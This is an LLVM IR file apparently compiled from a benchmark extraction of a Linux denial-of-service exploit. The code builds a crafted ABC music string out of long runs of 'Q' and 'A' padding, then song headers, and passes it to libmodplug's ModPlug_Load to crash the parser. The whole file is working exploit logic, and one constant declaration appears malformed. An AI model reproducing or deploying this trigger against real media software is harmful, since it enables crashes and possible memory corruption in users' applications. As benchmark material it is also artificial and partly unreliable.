; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_17222.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_17222.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.test = private unnamed_addr constant [512 x i8] calign 16
@.str = private unnamed_addr constant [46 x i8] c"T: Here Without You (Transcribed by: Bungee)\0A\00", align 1
@.str.1 = private unnamed_addr constant [17 x i8] c"Z: 3 Doors Down\0A\00", align 1
@.str.2 = private unnamed_addr constant [8 x i8] c"L: 1/4\0A\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"Q: 108\0A\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"K: C\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [60 x i8] c"[A,3A3/4] [E9/8z3/8] A3/8 [c9/8z3/8] [A9/8z3/8] [E3/4z3/8]\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %4 = bitcast [512 x i8]* %2 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %4, i8* align 16 getelementptr inbounds ([512 x i8], [512 x i8]* @__const.main.test, i32 0, i32 0), i64 512, i1 false)
  %5 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %6 = call i32 @strlen(i8* %5)
  store i32 %6, i32* %3, align 4
  br label %7

7:                                                ; preds = %10, %0
  %8 = load i32, i32* %3, align 4
  %9 = icmp ult i32 %8, 278
  br i1 %9, label %10, label %15

10:                                               ; preds = %7
  %11 = load i32, i32* %3, align 4
  %12 = add i32 %11, 1
  store i32 %12, i32* %3, align 4
  %13 = zext i32 %11 to i64
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 %13
  store i8 81, i8* %14, align 1
  br label %7

15:                                               ; preds = %7
  %16 = load i32, i32* %3, align 4
  %17 = add i32 %16, 1
  store i32 %17, i32* %3, align 4
  %18 = zext i32 %16 to i64
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 %18
  store i8 81, i8* %19, align 1
  %20 = load i32, i32* %3, align 4
  %21 = add i32 %20, 1
  store i32 %21, i32* %3, align 4
  %22 = zext i32 %20 to i64
  %23 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 %22
  store i8 51, i8* %23, align 1
  %24 = load i32, i32* %3, align 4
  %25 = add i32 %24, 1
  store i32 %25, i32* %3, align 4
  %26 = zext i32 %24 to i64
  %27 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 %26
  store i8 51, i8* %27, align 1
  %28 = load i32, i32* %3, align 4
  %29 = add i32 %28, 1
  store i32 %29, i32* %3, align 4
  %30 = zext i32 %28 to i64
  %31 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 %30
  store i8 52, i8* %31, align 1
  br label %32

32:                                               ; preds = %35, %15
  %33 = load i32, i32* %3, align 4
  %34 = icmp ult i32 %33, 286
  br i1 %34, label %35, label %40

35:                                               ; preds = %32
  %36 = load i32, i32* %3, align 4
  %37 = add i32 %36, 1
  store i32 %37, i32* %3, align 4
  %38 = zext i32 %36 to i64
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 %38
  store i8 65, i8* %39, align 1
  br label %32

40:                                               ; preds = %32
  %41 = load i32, i32* %3, align 4
  %42 = add i32 %41, 1
  store i32 %42, i32* %3, align 4
  %43 = zext i32 %41 to i64
  %44 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 %43
  store i8 10, i8* %44, align 1
  %45 = load i32, i32* %3, align 4
  %46 = zext i32 %45 to i64
  %47 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 %46
  store i8 0, i8* %47, align 1
  %48 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %49 = call i32 @strcat(i8* %48, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str, i64 0, i64 0))
  %50 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %51 = call i32 @strcat(i8* %50, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  %52 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %53 = call i32 @strcat(i8* %52, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0))
  %54 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %55 = call i32 @strcat(i8* %54, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %57 = call i32 @strcat(i8* %56, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %58 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %59 = call i32 @strcat(i8* %58, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.5, i64 0, i64 0))
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %61 = call i32 @strlen(i8* %60)
  store i32 %61, i32* %3, align 4
  %62 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %63 = load i32, i32* %3, align 4
  %64 = call i32 @ModPlug_Load(i8* %62, i32 %63)
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @ModPlug_Load(i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
